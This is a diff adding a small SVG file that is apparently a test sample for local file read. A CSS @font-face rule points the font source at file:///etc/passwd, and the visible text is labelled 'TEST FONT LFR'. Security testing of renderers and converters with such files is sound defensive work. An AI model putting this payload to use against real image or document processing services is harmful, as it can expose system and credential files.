@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
+  <style>
+    @font-face {
+      font-family: pwn;
+      src: url("file:///etc/passwd");
+    }
+    text { font-family: pwn; }
+  </style>
+  <rect width="800" height="600" fill="white"/>
+  <text x="10" y="100" font-size="40" fill="black">TEST FONT LFR</text>
+</svg>
